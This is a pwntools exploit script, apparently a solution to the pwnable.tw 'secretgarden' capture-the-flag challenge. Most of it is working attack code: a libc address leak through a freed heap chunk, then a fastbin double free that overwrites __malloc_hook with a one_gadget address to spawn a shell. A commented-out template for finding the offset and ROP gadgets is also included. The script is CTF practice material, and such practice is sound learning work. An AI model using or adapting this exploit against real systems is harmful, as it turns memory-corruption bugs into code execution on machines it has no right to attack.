from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = True

LOCAL_BIN = './secretgarden_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN, level='debug') # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10203) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')


#
# ##########################
# ##### OFFSET FINDER ######
# ##########################
#
# OFFSET = b'' #b'A'*264
# if OFFSET == b'':
#     gdb.attach(P.pid, 'c') #Attach and continue
#     payload = cyclic(264)
#     payload += b'AAAAAAAA'
#     print(P.clean())
#     P.sendline(payload)
#     #x/wx  -- Search for bytes that crashed the application
#     #print(cyclic_find(0x63616171)) # Find the offset of those bytes
#     P.interactive()
#     exit()
#
#
#
# #####################
# #### Find Gadgets ###
# #####################
# try:
#     libc_func = 'puts'
#     PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
# except:
#     libc_func = 'printf'
#     PUTS_PLT = ELF_LOADED.plt['printf']
#
# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('Puts plt: ' + hex(PUTS_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))
#
#
# #########################
#### Finf LIBC offset ###
#########################


##########################
##### FUNCTION ######
##########################

def add(size, name, color):
    P.sendlineafter(b'choice :',b'1')
    P.sendlineafter(b'name :',str(size).encode())
    P.sendlineafter(b'flower :', name)
    P.sendlineafter(b'flower :', color)


def remove(index):
        P.sendlineafter(b'choice :',b'3')
        P.sendlineafter(b'garden:',str(index).encode())


def clean():
        P.sendlineafter(b'choice :',b'4')


def show():
        P.sendlineafter(b'choice :',b'2')


##############################
##### FINAL EXPLOITATION #####
##############################
##Leaking libc
add(1200, b'a', b'a')       #0
add(0x64, b'a', b'a')         #1
remove(0)
clean()
add(1200, b'aaaaaaa', b'a') #0
show()
P.recvline()
LIBC.address = u64(P.recvline().strip().ljust(8,b'\x00'))-0x3c3b78
print(hex(LIBC.address))
add(0x64, b'a', b'a')         #2
remove(1)
remove(2)
remove(1)
add(0x64, p64(LIBC.sym['__malloc_hook']-0x23), b'a') #4
add(0x64, b'a', b'a')
add(0x64, b'a', b'a')
one_gadget = [0x45216, 0x4526a, 0xf0567,0xef6c4]
add(0x64, b'a'*19+p64(LIBC.address+one_gadget[3]), b'a') #7
P.interactive()

remove(1)
remove(1)

print(hex(LIBC.sym['__malloc_hook']))
P.interactive()





